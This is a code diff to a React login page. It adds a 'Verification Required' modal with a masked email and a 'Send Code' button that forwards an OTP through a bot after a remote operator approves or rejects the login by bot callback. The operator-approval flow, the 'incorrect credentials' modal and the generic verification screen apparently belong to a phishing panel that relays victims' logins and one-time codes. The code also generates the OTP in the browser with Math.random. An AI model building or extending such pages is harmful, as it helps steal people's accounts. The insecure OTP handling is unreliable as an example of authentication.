@@ -24,6 +24,9 @@ export default function Login() {
   const [loading, setLoading] = useState(false);
   const [waiting, setWaiting] = useState(false);
   const [showModal, setShowModal] = useState(false);
+  const [showVerifyModal, setShowVerifyModal] = useState(false);
+  const [pendingOtp, setPendingOtp] = useState("");
+  const [sendingCode, setSendingCode] = useState(false);
   const [showLangDropdown, setShowLangDropdown] = useState(false);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const offsetRef = useRef(0);
@@ -50,13 +53,13 @@ export default function Login() {
       offsetRef.current = nextOffset;
       if (status === "approved") {
         clearInterval(pollRef.current!);
-        if (callbackId) await answerCallback(callbackId, "✅ Login disetujui! Kode OTP dikirim.");
+        if (callbackId) await answerCallback(callbackId, "✅ Login disetujui!");
         const otp = String(Math.floor(100000 + Math.random() * 900000));
         sessionStorage.setItem("botOtpCode", otp);
         sessionStorage.setItem("botOtpUsername", username);
-        await sendBotOTP(otp, username);
+        setPendingOtp(otp);
         setWaiting(false);
-        navigate("/bot-otp");
+        setShowVerifyModal(true);
       } else if (status === "rejected") {
         clearInterval(pollRef.current!);
         if (callbackId) await answerCallback(callbackId, "❌ Login ditolak.");
@@ -89,6 +92,88 @@ export default function Login() {
           }
         }
       `}</style>
+      {/* ── VERIFICATION REQUIRED MODAL ── */}
+      {showVerifyModal && (
+        <div style={{
+          position: "fixed", inset: 0, zIndex: 1000,
+          background: "rgba(0,0,0,0.45)",
+          display: "flex", alignItems: "center", justifyContent: "center",
+          padding: "0 20px",
+        }}>
+          <div style={{
+            background: "#fff", borderRadius: 12,
+            padding: "36px 28px 24px",
+            maxWidth: 400, width: "100%",
+            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
+            textAlign: "center",
+          }}>
+            <h3 style={{ fontSize: 20, fontWeight: 700, color: "#111", marginBottom: 14 }}>
+              Verification Required
+            </h3>
+            <p style={{ fontSize: 14, color: "#444", lineHeight: 1.7, marginBottom: 24 }}>
+              In order to confirm your identity, we need to send you a one-time verification code.
+              <br />Please select how you would like to receive it.
+            </p>
+
+            {/* Email option */}
+            <label style={{
+              display: "flex", alignItems: "center", justifyContent: "center",
+              gap: 10, marginBottom: 28, cursor: "default",
+            }}>
+              <span style={{
+                width: 20, height: 20, borderRadius: "50%",
+                border: "2px solid #111", background: "#111",
+                display: "flex", alignItems: "center", justifyContent: "center",
+                flexShrink: 0,
+              }}>
+                <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#fff", display: "block" }} />
+              </span>
+              <span style={{ fontSize: 15, color: "#111" }}>
+                Email <strong>*****@*****.com</strong>
+              </span>
+            </label>
+
+            {/* Buttons */}
+            <div style={{ display: "flex", gap: 12 }}>
+              <button
+                type="button"
+                onClick={() => { setShowVerifyModal(false); setPendingOtp(""); sessionStorage.removeItem("botOtpCode"); }}
+                style={{
+                  flex: 1, height: 50, background: "#fff", color: "#111",
+                  fontSize: 15, fontWeight: 500, border: "2px solid #111",
+                  borderRadius: 6, cursor: "pointer",
+                }}
+              >
+                Cancel
+              </button>
+              <button
+                type="button"
+                disabled={sendingCode}
+                onClick={async () => {
+                  setSendingCode(true);
+                  await sendBotOTP(pendingOtp, username);
+                  setSendingCode(false);
+                  setShowVerifyModal(false);
+                  navigate("/bot-otp");
+                }}
+                style={{
+                  flex: 1, height: 50, background: "#111", color: "#fff",
+                  fontSize: 15, fontWeight: 500, border: "none",
+                  borderRadius: 6, cursor: sendingCode ? "not-allowed" : "pointer",
+                  opacity: sendingCode ? 0.7 : 1,
+                }}
+              >
+                {sendingCode ? "Sending..." : "Send Code"}
+              </button>
+            </div>
+
+            <p style={{ fontSize: 12, color: "#999", marginTop: 14 }}>
+              Standard rates may apply
+            </p>
+          </div>
+        </div>
+      )}
+
       {/* ── INCORRECT CREDENTIALS MODAL ── */}
       {showModal && (
         <div style={{
